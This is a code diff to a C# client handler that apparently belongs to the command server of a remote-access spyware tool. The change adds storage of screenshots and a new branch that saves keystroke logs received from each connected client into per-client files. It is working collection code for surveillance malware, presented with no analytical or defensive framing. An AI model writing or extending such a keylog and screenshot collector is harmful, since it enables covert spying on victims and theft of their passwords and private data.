@@ -126,23 +126,42 @@ class ClientHandler
     {
         try
         {
+            Console.WriteLine($"[Client {ClientID}] Handling client...");
+
+            if (!Directory.Exists("logs"))
+            {
+                Directory.CreateDirectory("logs");
+            }
+
             string line;
             while (!string.IsNullOrWhiteSpace(line = reader.ReadLine()))
             {
-                Console.WriteLine($"[Client {ClientID}] {line}");
+                Console.WriteLine($"[Client {ClientID}] Received: {line}"); 
             }
 
             while (true)
             {
                 line = reader.ReadLine();
-                if (line == null) break;
+                if (line == null)
+                {
+                    Console.WriteLine($"[Client {ClientID}] Disconnected.");
+                    break;
+                }
+
+                Console.WriteLine($"[Client {ClientID}] Received: {line}"); 
 
                 if (line.StartsWith("[SCREENSHOT]"))
                 {
                     string base64Image = line.Replace("[SCREENSHOT] ", "");
                     byte[] imageData = Convert.FromBase64String(base64Image);
-                    File.WriteAllBytes($"screenshot_{ClientID}_{DateTime.Now:yyyyMMdd_HHmmss}.jpg", imageData);
+                    File.WriteAllBytes($"screenshots/screenshot_{ClientID}_{DateTime.Now:yyyyMMdd_HHmmss}.jpg", imageData);
                     Console.WriteLine($"[Client {ClientID}] Screenshot saved.");
+                }
+                else if (line.StartsWith("[KEYLOG]"))
+                {
+                    string logEntry = line.Replace("[KEYLOG] ", "");
+                    File.AppendAllText($"logs/keylog_{ClientID}.txt", logEntry + Environment.NewLine); 
+                    Console.WriteLine($"[Client {ClientID}] Keylog: {logEntry}");
                 }
                 else
                 {
@@ -155,7 +174,6 @@ class ClientHandler
             Console.WriteLine($"[Client {ClientID} Error] {ex.Message}");
         }
     }
-
     public void Interact()
     {
         while (true)
